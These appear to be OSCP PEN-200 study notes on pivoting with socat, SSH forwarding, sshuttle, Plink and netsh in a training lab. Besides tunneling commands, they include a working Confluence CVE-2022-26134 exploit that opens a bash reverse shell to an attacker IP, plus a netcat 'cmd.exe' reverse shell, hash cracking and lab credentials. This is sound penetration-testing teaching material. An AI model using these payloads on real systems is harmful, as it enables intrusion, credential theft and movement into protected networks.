---
title: "PEN-200 Chapter 18 - Port Redirection and SSH Tunneling"
aliases:
  - "PEN-200 Ch18"
  - "Port Redirection and SSH Tunneling"
tags:
  - oscp
  - pen-200
  - pivoting
  - tunneling
  - ssh
  - port-forwarding
  - socat
  - proxychains
  - sshuttle
  - windows
  - netsh
source: "PEN-200 Chapter 18"
---

# PEN-200 Chapter 18 — Port Redirection and SSH Tunneling

> [!summary]
> This chapter is fundamentally about **pivoting through segmented networks**. After compromising a host that can reach networks Kali cannot directly route to, you use **port forwarding** or **SSH tunneling** to make internal services reachable from your attacking machine. The chapter progresses from simple one-port relays with `socat`, through SSH local/dynamic/remote/remote-dynamic forwarding, to `sshuttle`, Windows OpenSSH, Plink, and Netsh.

## Attack-chain position

`Recon → Enumeration → Initial Access → Privilege Escalation → Credentials → **Pivoting** → AD → Proof`

Chapter 18 sits primarily in **Pivoting**, but it also connects several adjacent stages:

- **Recon / Enumeration:** identify interfaces, routes, reachable subnets, open internal ports, and services.
- **Initial Access:** the chapter's lab begins by exploiting Confluence CVE-2022-26134 to obtain a reverse shell.
- **Credentials:** database credentials are recovered from a Confluence config; user hashes are extracted and cracked.
- **Pivoting:** the core of the chapter—make services on otherwise unreachable networks accessible.
- **AD / deeper internal attack:** once routing/tunneling is established, the same methods let you reach SMB, RDP, LDAP, Kerberos, WinRM, SQL, and other internal services used during Windows/AD attacks.
- **Proof:** a tunnel does not itself prove compromise, but it gives Kali direct or proxy-based access so you can enumerate, exploit, and retrieve proof from deeper hosts.

---

# 18.1 Why Port Redirection and Tunneling?

Real networks are usually **segmented**, not flat. A compromised machine may have access to an internal subnet that your Kali host cannot route to directly.

Important ideas:

- **Flat network:** hosts can generally communicate freely with each other.
- **Segmented network:** systems are divided into subnets and communication is restricted to what is required.
- **Firewall:** controls traffic by source/destination addresses, ports, direction, and sometimes other properties.
- **Deep Packet Inspection (DPI):** inspects packet contents, not only address/port metadata.
- **Port redirection / forwarding:** accept traffic on one socket and relay it to another socket.
- **Tunneling:** encapsulate one protocol/data stream inside another. In this chapter, the principal tunnel is SSH.
- **Attacker goal:** use an already-compromised host as a bridge into networks or services that Kali cannot reach directly.

### Mental model

Think in terms of four questions:

1. **Where can Kali connect?**
2. **Where can the compromised host connect?**
3. **Which host can run the forwarding/tunneling software?**
4. **Where must the listening socket exist so that your traffic can reach it?**

> [!tip] OSCP mindset
> Before choosing a tunneling method, draw the path:
> `Kali → pivot → target service`
>
> Then identify which side can initiate connections. This usually tells you whether you need a **local**, **remote**, or **dynamic** forward.

---

# 18.2 Port Forwarding with Linux Tools

Port forwarding makes one host listen on a TCP port and relay received traffic to another destination.

This is the lowest-complexity pivoting technique in the chapter.

## 18.2.1 A Simple Port Forwarding Scenario

The scenario starts with:

- Kali on a WAN/external-style network.
- `CONFLUENCE01` reachable from Kali and also connected to an internal DMZ.
- `PGDATABASE01` only reachable from `CONFLUENCE01`.
- Confluence exposed on TCP/8090.
- PostgreSQL on `PGDATABASE01` TCP/5432.
- Credentials for PostgreSQL discovered on `CONFLUENCE01`.

Representative topology:

```text
Kali
  |
  | directly routable
  v
CONFLUENCE01
  | 192.168.50.63
  | 10.4.50.63
  |
  | internal DMZ
  v
PGDATABASE01
  10.4.50.215:5432
```

The key observation is that **Kali cannot directly route to `10.4.50.215`, but `CONFLUENCE01` can**.

That makes `CONFLUENCE01` a pivot.

## 18.2.2 Setting Up the Lab Environment

The chapter gains initial access to `CONFLUENCE01` through **CVE-2022-26134**, an OGNL injection vulnerability in Confluence.

### Original public proof-of-concept

```bash
curl -v \
'http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/'
```

**Tool: `curl`**

- `-v` — verbose HTTP request/response information.
- URL points to the vulnerable Confluence service.
- The path contains a URL-encoded OGNL expression.

### URL-decoded payload

```text
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
```

What it does:

- Uses OGNL expression injection.
- Creates a Java `ScriptEngineManager`.
- Selects the Nashorn JavaScript engine.
- Uses Java `ProcessBuilder`.
- Executes:
  ```bash
  bash -c 'bash -i >& /dev/tcp/10.0.0.28/1270 0>&1'
  ```
- `bash -i` starts interactive Bash.
- `>& /dev/tcp/IP/PORT` redirects shell I/O into a TCP connection.
- `0>&1` connects stdin to the same stream.

> [!warning]
> The chapter explicitly emphasizes understanding a public PoC before executing it. It also notes that for this exploit, blindly URL-encoding every character can break parsing. Characters such as `.`, `-`, and `/` must remain as expected by the vulnerable application.

### Modified exploit used in the lab

```bash
curl \
'http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/'
```

Changes:

- Vulnerable target → `192.168.50.63:8090`
- Reverse-shell destination → `192.168.118.4:4444`
- `-v` was removed.

### Start the reverse-shell listener

```bash
nc -nvlp 4444
```

**Tool: Netcat (`nc`)**

- `-n` — numeric addresses only; avoid DNS resolution.
- `-v` — verbose.
- `-l` — listen mode.
- `-p 4444` — listen on TCP/4444.

Use this when a reverse-shell payload will connect back to Kali.

### Confirm the shell user

```bash
id
```

Shows UID, GID, and group memberships. In the lab, the shell runs as the low-privileged `confluence` user.

### Enumerate interfaces

```bash
ip addr
```

Purpose:

- Identify all network interfaces.
- Find additional IP addresses/subnets that reveal pivot opportunities.

The lab host has:

- `192.168.50.63/24`
- `10.4.50.63/24`

This is the first strong sign that the compromised host can bridge two network segments.

### Enumerate routes

```bash
ip route
```

Purpose:

- Determine which networks the host knows how to reach.
- Confirm which interface/gateway is used for internal subnets.

The relevant internal route is `10.4.50.0/24`.

### Read the Confluence configuration

```bash
cat /var/atlassian/application-data/confluence/confluence.cfg.xml
```

The file exposes:

```xml
<property name="hibernate.connection.password">D@t4basePassw0rd!</property>
<property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>
<property name="hibernate.connection.username">postgres</property>
```

This gives:

- PostgreSQL host: `10.4.50.215`
- Port: `5432`
- Database: `confluence`
- Username: `postgres`
- Password: `D@t4basePassw0rd!`

Problem: Kali has `psql`, but Kali cannot route to `10.4.50.215`. `CONFLUENCE01` can reach it, but it lacks the PostgreSQL client.

This is exactly the kind of problem port forwarding solves.

---

## 18.2.3 Port Forwarding with Socat

**Socat** is a general-purpose bidirectional data relay. It can listen on one socket and forward traffic to another.

### Forward a local listening port to PostgreSQL

Run on `CONFLUENCE01`:

```bash
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
```

Argument breakdown:

- `-ddd` — very verbose/debug output.
- `TCP-LISTEN:2345` — listen on TCP/2345.
- `fork` — fork a new child process per connection so the listener can accept multiple connections.
- `TCP:10.4.50.215:5432` — connect each accepted connection to PostgreSQL on `PGDATABASE01`.

Why port `2345`?

- It is above the privileged range (`0-1024`), so the unprivileged `confluence` account can bind it.

Traffic flow:

```text
Kali:psql
   |
   v
192.168.50.63:2345
CONFLUENCE01:socat
   |
   v
10.4.50.215:5432
PGDATABASE01:PostgreSQL
```

### Connect through the Socat forward

On Kali:

```bash
psql -h 192.168.50.63 -p 2345 -U postgres
```

Arguments:

- `-h 192.168.50.63` — connect to the pivot, not directly to the DB.
- `-p 2345` — the Socat listening port.
- `-U postgres` — PostgreSQL username.

Inside `psql`:

```sql
\l
```

Lists databases.

```sql
\c confluence
```

Connects to the `confluence` database.

```sql
select * from cwd_user;
```

Dumps the `cwd_user` table containing Confluence user data including password hashes.

### Crack Atlassian password hashes

```bash
hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt
```

**Tool: Hashcat**

- `-m 12001` — Atlassian PBKDF2-HMAC-SHA1 format used in the chapter.
- `hashes.txt` — input hash file.
- `/usr/share/wordlists/fasttrack.txt` — candidate password wordlist.

The lab recovers credentials including:

```text
rdp_admin       : P@ssw0rd!
database_admin  : sqlpass123
hr_admin        : Welcome1234
```

The important attack-chain lesson is not the specific passwords; it is **credential reuse**. Credentials extracted through a pivot may unlock other internal protocols.

### Change the Socat forward from PostgreSQL to SSH

Run on `CONFLUENCE01`:

```bash
socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
```

- Listen on `CONFLUENCE01:2222`.
- Forward to `PGDATABASE01:22`.

Then from Kali:

```bash
ssh database_admin@192.168.50.63 -p2222
```

- `database_admin@192.168.50.63` — authenticate to the forwarded endpoint through the pivot.
- `-p2222` — connect to the non-standard listening port.
- The SSH server actually answering is `PGDATABASE01:22`.

### Other Linux forwarding possibilities mentioned

#### `rinetd`

Daemon-oriented TCP redirector. Better suited to longer-lived forwarding than one-off ad hoc pivots.

#### Netcat + FIFO

Netcat can be combined with a named pipe (FIFO) to relay data between sockets.

#### `iptables`

With root privileges, Linux packet-forwarding/NAT rules can be used.

Linux forwarding may also need to be enabled by writing `1` to:

```text
/proc/sys/net/ipv4/conf/[interface]/forwarding
```

Example concept:

```bash
echo 1 | sudo tee /proc/sys/net/ipv4/conf/<interface>/forwarding
```

The chapter does not provide a complete generic `iptables` ruleset because the exact rules depend on the host's existing network configuration.

---

# 18.3 SSH Tunneling

SSH is not only an encrypted remote shell protocol. It can encapsulate arbitrary TCP traffic.

The chapter covers four OpenSSH forwarding modes:

| Mode | SSH option | Listening socket exists on | Forwarding happens from | Best mental model |
|---|---|---|---|---|
| Local | `-L` | SSH **client** | SSH **server** side | "I can SSH from the pivot toward the inside." |
| Dynamic | `-D` | SSH **client** | SSH **server** side | Local SOCKS proxy |
| Remote | `-R listen:target` | SSH **server** | SSH **client** side | Reverse port forward |
| Remote dynamic | `-R port` | SSH **server** | SSH **client** side | Reverse SOCKS proxy |

> [!important]
> The decisive question is **which side can initiate the SSH connection** and **where you need the listening socket**.

---

## 18.3.1 SSH Local Port Forwarding

Local forwarding is created by the **SSH client**.

General syntax:

```bash
ssh -L [LISTEN_IP:]LISTEN_PORT:DEST_IP:DEST_PORT user@SSH_SERVER
```

The first socket belongs to the SSH client. The destination is reached from the SSH server side.

### Upgrade the reverse shell to a TTY

On `CONFLUENCE01`:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

- Imports Python's `pty` module.
- Spawns `/bin/bash` attached to a pseudo-terminal.
- Useful because interactive programs such as SSH behave much better with TTY functionality.

### SSH from `CONFLUENCE01` to `PGDATABASE01`

```bash
ssh database_admin@10.4.50.215
```

This establishes that the pivot can directly reach the database server over SSH.

### Enumerate `PGDATABASE01`

```bash
ip addr
```

Reveals a second internal network:

```text
10.4.50.215/24
172.16.50.215/24
```

```bash
ip route
```

Confirms the route to:

```text
172.16.50.0/24
```

Now `PGDATABASE01` becomes another potential pivot point.

### Sweep the new subnet for SMB

```bash
for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done
```

Breakdown:

- `seq 1 254` — generate host IDs for a `/24`.
- `nc` — test TCP connections.
- `-z` — zero-I/O scan mode; only test whether the port accepts a connection.
- `-v` — verbose.
- `-w 1` — one-second timeout.
- `172.16.50.$i 445` — test TCP/445 on each host.

The lab finds:

```text
172.16.50.217:445 open
```

### Create a local port forward

Run from `CONFLUENCE01`:

```bash
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
```

Breakdown:

- `-N` — do not execute a remote command/open a shell; use SSH only for forwarding.
- `-L` — local port forward.
- `0.0.0.0:4455` — listen on all interfaces of the SSH client (`CONFLUENCE01`) on TCP/4455.
- `172.16.50.217:445` — destination reachable from the SSH server side (`PGDATABASE01`).
- `database_admin@10.4.50.215` — SSH server and account.

Traffic:

```text
Kali
  |
  v
CONFLUENCE01:4455   <-- listener belongs to SSH client
  |
  | encrypted SSH tunnel
  v
PGDATABASE01
  |
  v
172.16.50.217:445
```

### SSH debugging

If forwarding fails:

```bash
ssh -v ...
```

- `-v` — verbose/debug information.
- More `v`s (`-vv`, `-vvv`) can increase verbosity.

### Confirm the listener

```bash
ss -ntplu
```

Useful flags:

- `-n` — numeric addresses/ports.
- `-t` — TCP.
- `-p` — show process information where permitted.
- `-l` — listening sockets.
- `-u` — UDP.

The expected listener is `0.0.0.0:4455`.

### List SMB shares through the forward

```bash
smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234
```

Arguments:

- `-p 4455` — use the forwarded TCP port instead of SMB's normal port.
- `-L` — list available shares.
- `//192.168.50.63/` — connect to `CONFLUENCE01`; the tunnel carries traffic onward.
- `-U hr_admin` — SMB username.
- `--password=Welcome1234` — password.

### Connect to the `scripts` share

```bash
smbclient -p 4455 //192.168.50.63/scripts -U hr_admin --password=Welcome1234
```

Inside `smbclient`:

```text
ls
```

Lists files.

```text
get Provisioning.ps1
```

Downloads the file to Kali.

**When local forwarding is useful**

Use it when:

- Your compromised/pivot host can run an SSH client.
- It can SSH to a deeper host.
- Kali can connect to a port bound on the first pivot.
- You need one or a small number of specific destination sockets.

---

## 18.3.2 SSH Dynamic Port Forwarding

Local forwarding maps one listening socket to one destination socket. Dynamic forwarding instead creates a **SOCKS proxy**, allowing one listener to reach many destinations.

General syntax:

```bash
ssh -N -D [LISTEN_IP:]LISTEN_PORT user@SSH_SERVER
```

### Create the SOCKS listener

From `CONFLUENCE01`:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then:

```bash
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
```

Breakdown:

- `-N` — forwarding only.
- `-D 0.0.0.0:9999` — create a SOCKS proxy on all interfaces of the SSH client at TCP/9999.
- Traffic entering this SOCKS listener travels through SSH and exits from `PGDATABASE01`.

This lets you address any host/socket reachable from `PGDATABASE01`, not only one fixed service.

### Confirm the port if needed

```bash
ss -ntplu
```

Expected listener:

```text
0.0.0.0:9999
```

### Proxychains

Many tools do not natively know how to speak SOCKS. **Proxychains** hooks dynamically linked networking calls and forces them through a configured proxy.

Default config:

```text
/etc/proxychains4.conf
```

Inspect the tail:

```bash
tail /etc/proxychains4.conf
```

Configure:

```ini
[ProxyList]
socks5 192.168.50.63 9999
```

Meaning:

- `socks5` — SOCKS protocol version.
- `192.168.50.63` — `CONFLUENCE01`.
- `9999` — dynamic SSH SOCKS listener.

The chapter notes:

- SSH supports SOCKS4 and SOCKS5.
- SOCKS5 supports features such as authentication, IPv6, and UDP including DNS.
- Proxychains works through `LD_PRELOAD` and commonly works with dynamically linked binaries.
- It does **not** work with statically linked binaries.

### Run `smbclient` through Proxychains

```bash
proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
```

`proxychains` is prepended to a normal command; the application can then be written as though the destination were directly reachable.

### Nmap through Proxychains

```bash
proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217
```

Arguments:

- `-vvv` — high verbosity.
- `-sT` — TCP connect scan. This matters because Proxychains operates on normal TCP `connect()` calls; raw SYN scanning is not appropriate through this setup.
- `--top-ports=20` — scan Nmap's 20 most common ports.
- `-Pn` — skip host discovery and treat the host as up.

> [!note] Source detail worth remembering
> The surrounding chapter text says to use `-n` to skip DNS resolution, but the actual Listing 544 command shown in the chapter omits `-n`, and its output performs DNS resolution. For an OSCP workflow, adding `-n` is often useful when DNS through the tunnel is unnecessary:
>
> ```bash
> proxychains nmap -vvv -sT --top-ports=20 -Pn -n 172.16.50.217
> ```

The scan finds TCP ports `135`, `139`, `445`, and `3389` open.

### Speed up Proxychains scans

The chapter warns that default timeouts can make scanning slow. In `/etc/proxychains4.conf`, lowering:

```ini
tcp_read_time_out
tcp_connect_time_out
```

can substantially reduce waiting time on filtered/non-responsive ports.

**When dynamic forwarding is useful**

Use it when:

- You need to enumerate multiple hosts/ports behind a pivot.
- You can establish SSH from the pivot toward an SSH server that has useful network access.
- You want a single SOCKS port rather than one `-L` forward per target service.

---

## 18.3.3 SSH Remote Port Forwarding

Remote forwarding reverses the placement of the listener.

With `-R`:

- The listening port is created on the **SSH server**.
- Connections to that listener are sent through the SSH tunnel.
- The **SSH client** side then connects to the destination.

This is ideal when **inbound connections to the compromised network are blocked, but outbound SSH is allowed**.

### Start the SSH server on Kali

```bash
sudo systemctl start ssh
```

Starts the OpenSSH server (`sshd`) on Kali.

### Confirm SSH is listening

```bash
sudo ss -ntplu
```

Expected TCP/22 listeners:

```text
0.0.0.0:22
[::]:22
```

The chapter also notes that password-based SSH login may require:

```text
PasswordAuthentication yes
```

in:

```text
/etc/ssh/sshd_config
```

### Upgrade the compromised shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Create the remote port forward

Run on `CONFLUENCE01`:

```bash
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```

Breakdown:

- `-N` — no interactive remote shell.
- `-R` — remote port forward.
- `127.0.0.1:2345` — bind TCP/2345 on the SSH **server** (Kali).
- `10.4.50.215:5432` — from the SSH **client** side (`CONFLUENCE01`), forward to PostgreSQL.
- `kali@192.168.118.4` — SSH into Kali from the compromised host.

Traffic:

```text
Kali:127.0.0.1:2345   <-- listener on SSH server
        |
        | SSH tunnel
        v
CONFLUENCE01          <-- SSH client
        |
        v
10.4.50.215:5432
```

### Verify the Kali-side listener

```bash
ss -ntplu
```

Expected:

```text
127.0.0.1:2345
```

### Use PostgreSQL through the remote forward

```bash
psql -h 127.0.0.1 -p 2345 -U postgres
```

Inside:

```sql
\l
```

**When remote forwarding is useful**

Use it when:

- You have code execution on an internal/perimeter host.
- Inbound connections to new ports on that host are blocked.
- The compromised host can make an outbound SSH connection to Kali.
- You need Kali to access one particular internal socket.

Think: **"reverse shell, but for a TCP port."**

---

## 18.3.4 SSH Remote Dynamic Port Forwarding

Remote dynamic forwarding combines:

- the reverse direction of remote forwarding, and
- the flexibility of a SOCKS proxy.

The SOCKS listener is created on the **SSH server** (Kali), while traffic exits from the **SSH client** (compromised host).

Requirement from the chapter:

- OpenSSH **client** version 7.6+.
- Server version does not need to be 7.6+.

### Create a reverse SOCKS tunnel

On `CONFLUENCE01`:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then:

```bash
ssh -N -R 9998 kali@192.168.118.4
```

Why this is different from classic `-R`:

- Only one socket/port is supplied.
- `9998` becomes a SOCKS proxy listener on the SSH server (Kali).
- With only a port specified, it binds to Kali's loopback interface by default.

### Confirm the SOCKS port on Kali

```bash
sudo ss -ntplu
```

Expected:

```text
127.0.0.1:9998
[::1]:9998
```

### Point Proxychains to the local SOCKS port

```bash
tail /etc/proxychains4.conf
```

Configuration:

```ini
[ProxyList]
socks5 127.0.0.1 9998
```

### Scan an internal Windows host

```bash
proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.50.64
```

Arguments:

- `proxychains` — force TCP connections through the SOCKS listener.
- `-vvv` — verbose Nmap output.
- `-sT` — TCP connect scan.
- `--top-ports=20` — scan top 20 TCP ports.
- `-Pn` — assume host is up.
- `-n` — no DNS resolution.

The lab discovers:

```text
80/tcp
135/tcp
3389/tcp
```

**When remote dynamic forwarding is useful**

Use it when:

- You can get a compromised machine to SSH outward to Kali.
- New inbound listeners on the victim/pivot are blocked.
- You need broad internal enumeration rather than access to one fixed socket.
- You want Kali tooling to reach many internal destinations through Proxychains.

For OSCP-style networks, this is one of the most useful SSH pivoting patterns.

---

## 18.3.5 Using sshuttle

`sshuttle` creates a VPN-like experience over SSH by adding local routing/firewall rules so selected subnets are transparently pushed through the SSH connection.

Requirements stated by the chapter:

- **root privileges on the SSH client** (Kali side).
- **Python 3 on the SSH server**.

It is less lightweight than a simple SSH forward, but much easier when you need to interact with many hosts/services.

### First expose the internal SSH server with Socat

On `CONFLUENCE01`:

```bash
socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
```

This gives Kali an SSH path to `PGDATABASE01` through port `2222` on `CONFLUENCE01`.

### Build the sshuttle routes

On Kali:

```bash
sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
```

Breakdown:

- `-r` — specify the remote SSH connection.
- `database_admin@192.168.50.63:2222` — SSH connection through the Socat port forward.
- `10.4.50.0/24` — route this subnet through the tunnel.
- `172.16.50.0/24` — also route this subnet through the tunnel.

### Test transparent access

```bash
smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
```

No `proxychains` and no custom forwarded port are required. To userland tools, the internal host appears directly reachable.

**When sshuttle is useful**

Use it when:

- You have working SSH access into a network.
- You need access to one or more whole subnets.
- You want tools to work without explicit SOCKS support.
- Root on Kali and Python 3 on the remote SSH server are available.

> [!tip]
> For quick single-service access, `-L`/`-R` is simpler. For many hosts and ports, a SOCKS proxy or `sshuttle` is generally easier.

---

# 18.4 Port Forwarding with Windows Tools

The same pivoting concepts apply when the compromised/pivot host is Windows.

The chapter covers:

1. Windows built-in `ssh.exe`
2. Plink
3. Netsh `portproxy`

---

## 18.4.1 `ssh.exe`

Modern Windows versions commonly include the OpenSSH client under:

```text
%systemdrive%\Windows\System32\OpenSSH
```

Related executables may include:

```text
ssh.exe
scp.exe
sftp.exe
```

The Windows OpenSSH client can connect to Linux or Windows SSH servers; protocol compatibility matters, not the operating system.

### Start the SSH server on Kali

```bash
sudo systemctl start ssh
```

### RDP to the Windows pivot

```bash
xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.50.64
```

**Tool: `xfreerdp`**

- `/u:rdp_admin` — username.
- `/p:P@ssw0rd!` — password.
- `/v:192.168.50.64` — RDP target.

### Find `ssh.exe`

In Windows `cmd.exe`:

```cmd
where ssh
```

Expected result:

```text
C:\Windows\System32\OpenSSH\ssh.exe
```

### Check OpenSSH version

```cmd
ssh.exe -V
```

The chapter's host reports OpenSSH for Windows 8.1p1, which supports remote dynamic forwarding.

### Create a remote dynamic forward from Windows to Kali

```cmd
ssh -N -R 9998 kali@192.168.118.4
```

Arguments have the same meaning as on Linux:

- `-N` — tunnel only.
- `-R 9998` — create a remote dynamic SOCKS listener on Kali TCP/9998.
- `kali@192.168.118.4` — Kali SSH server.

### Verify on Kali

```bash
ss -ntplu
```

Expected listener:

```text
127.0.0.1:9998
```

### Configure Proxychains

```bash
tail /etc/proxychains4.conf
```

```ini
[ProxyList]
socks5 127.0.0.1 9998
```

### Connect to PostgreSQL through the Windows-created tunnel

```bash
proxychains psql -h 10.4.50.215 -U postgres
```

Arguments:

- `proxychains` — send TCP connections through the reverse SOCKS proxy.
- `-h 10.4.50.215` — internal PostgreSQL server.
- `-U postgres` — database user.
- Port omitted because `psql` uses default PostgreSQL TCP/5432.

Inside `psql`:

```sql
\l
```

**Key lesson:** a Windows host with the built-in OpenSSH client can be used almost exactly like a Linux SSH client for pivoting.

---

## 18.4.2 Plink

**Plink** is PuTTY's command-line SSH client.

Why it matters:

- OpenSSH may not be installed.
- PuTTY/Plink is common in Windows administration environments.
- It is lightweight and command-line friendly.
- The chapter notes that Plink does **not** provide remote dynamic forwarding, but it can perform classic remote forwarding.

### Start Apache on Kali to host files

```bash
sudo systemctl start apache2
```

### Locate `nc.exe`

```bash
find / -name nc.exe 2>/dev/null
```

Breakdown:

- `find /` — search from filesystem root.
- `-name nc.exe` — exact filename.
- `2>/dev/null` — suppress permission/error messages from stderr.

Lab path:

```text
/usr/share/windows-resources/binaries/nc.exe
```

### Copy `nc.exe` into the Apache web root

```bash
sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/
```

### Download `nc.exe` to the Windows target

From the web shell:

```cmd
powershell wget -Uri http://192.168.118.4/nc.exe -OutFile C:\Windows\Temp\nc.exe
```

PowerShell parameters:

- `wget` — PowerShell alias used here for web retrieval.
- `-Uri` — source URL.
- `-OutFile` — destination path.

### Listen for the Windows reverse shell

On Kali:

```bash
nc -nvlp 4446
```

### Execute the Windows reverse shell

On the target:

```cmd
C:\Windows\Temp\nc.exe -e cmd.exe 192.168.118.4 4446
```

- `-e cmd.exe` — execute `cmd.exe` and connect its I/O to the socket.
- `192.168.118.4 4446` — Kali listener.

### Locate Plink

On Kali:

```bash
find / -name plink.exe 2>/dev/null
```

Lab result:

```text
/usr/share/windows-resources/binaries/plink.exe
```

### Copy Plink to the web root

```bash
sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
```

### Download Plink to Windows

```cmd
powershell wget -Uri http://192.168.118.4/plink.exe -OutFile C:\Windows\Temp\plink.exe
```

### Create a Plink remote port forward

From the Windows target:

```cmd
C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR_PASSWORD_HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
```

Breakdown:

- `-ssh` — use SSH.
- `-l kali` — username on Kali.
- `-pw <...>` — password supplied on the command line.
- `-R 127.0.0.1:9833:127.0.0.1:3389` — on Kali, listen on loopback TCP/9833 and forward through the tunnel to Windows loopback TCP/3389.
- `192.168.118.4` — Kali SSH server.

> [!warning]
> Supplying a password with `-pw` may expose it in command history/process information/logging. The chapter suggests considering a dedicated port-forwarding-only account in hostile environments.

### Handling Plink's first-connection host-key prompt

Very limited shells may not let you type `y`. The chapter suggests piping a confirmation:

```cmd
cmd.exe /c echo y | C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR_PASSWORD_HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
```

The chapter's prose shows the same technique with a different example Kali IP (`192.168.41.7`); adapt the final SSH server address to the actual lab/engagement network.

### Confirm the listener on Kali

```bash
ss -ntplu
```

Expected:

```text
127.0.0.1:9833
```

### RDP through the Plink forward

```bash
xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
```

Here the RDP client connects to Kali loopback, but traffic is carried through Plink to Windows TCP/3389.

**When Plink is useful**

Use it when:

- Windows lacks OpenSSH.
- You can upload/run a small SSH client.
- You need local/remote-style TCP forwarding.
- Remote dynamic SOCKS forwarding is not required.

---

## 18.4.3 Netsh

`netsh` is built into Windows. Its `interface portproxy` context can create TCP port forwards.

Important restriction:

- Creating/modifying `portproxy` rules requires **administrative privileges**.
- UAC may matter depending on the shell/token you have.

The scenario forwards:

```text
MULTISERVER03:192.168.50.64:2222
                  |
                  v
PGDATABASE01:10.4.50.215:22
```

### RDP to the Windows administrator account

```bash
xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.50.64
```

Open an elevated `cmd.exe`.

### Add a Netsh IPv4-to-IPv4 port proxy

```cmd
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
```

Breakdown:

- `interface portproxy` — Netsh port forwarding context.
- `add v4tov4` — IPv4 listener to IPv4 destination.
- `listenport=2222` — local listening port.
- `listenaddress=192.168.50.64` — interface/address to bind.
- `connectport=22` — destination TCP port.
- `connectaddress=10.4.50.215` — destination host.

### Confirm Windows is listening

```cmd
netstat -anp TCP | find "2222"
```

Arguments:

- `-a` — all connections/listeners.
- `-n` — numeric addresses/ports.
- `-p TCP` — TCP only.
- `| find "2222"` — filter output for the forwarded port.

### Show all Netsh portproxy rules

```cmd
netsh interface portproxy show all
```

This verifies the configured mapping.

### Check the port from Kali

```bash
sudo nmap -sS 192.168.50.64 -Pn -n -p2222
```

Arguments:

- `-sS` — SYN scan.
- `-Pn` — skip host discovery.
- `-n` — no DNS resolution.
- `-p2222` — scan only TCP/2222.

Initially the chapter sees:

```text
2222/tcp filtered
```

The reason is Windows Firewall.

### Allow inbound TCP/2222 in Windows Firewall

```cmd
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
```

Breakdown:

- `advfirewall firewall add rule` — create a firewall rule.
- `name="port_forward_ssh_2222"` — memorable name used later for deletion.
- `protocol=TCP` — TCP.
- `dir=in` — inbound traffic.
- `localip=192.168.50.64` — apply to that local interface/IP.
- `localport=2222` — allow the forwarding listener.
- `action=allow` — permit matching traffic.

### Re-scan from Kali

```bash
sudo nmap -sS 192.168.50.64 -Pn -n -p2222
```

Now the port should be open.

### SSH through the Netsh forward

```bash
ssh database_admin@192.168.50.64 -p2222
```

Although you connect to the Windows host's TCP/2222, Netsh relays the traffic to `PGDATABASE01:22`.

### Remove the temporary firewall rule

```cmd
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
```

Do this when finished to restore the original firewall state.

### Remove the portproxy rule

```cmd
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
```

The rule is identified using:

- forwarding type: `v4tov4`
- `listenport`
- `listenaddress`

### Related PowerShell firewall cmdlets

The chapter notes PowerShell alternatives for many firewall operations, including:

```powershell
New-NetFirewallRule
Disable-NetFirewallRule
```

However, it specifically notes that `netsh interface portproxy` does not have a direct PowerShell equivalent, so Netsh remains useful for the forwarding component.

---

# 18.5 Wrapping Up

The chapter develops a progression from simple port relays to flexible tunneling:

1. **Socat:** simple host/port relay.
2. **SSH local (`-L`):** listener on the SSH client; fixed destination behind the SSH server.
3. **SSH dynamic (`-D`):** SOCKS listener on the SSH client; many destinations behind the SSH server.
4. **SSH remote (`-R listen:target`):** listener on the SSH server; useful when the compromised host can only connect outward.
5. **SSH remote dynamic (`-R port`):** reverse SOCKS proxy; highly useful when inbound firewall rules block you.
6. **sshuttle:** route whole subnets over SSH for near-transparent access.
7. **Windows `ssh.exe`:** modern Windows can use the same OpenSSH forwarding patterns.
8. **Plink:** lightweight Windows SSH client when OpenSSH is unavailable.
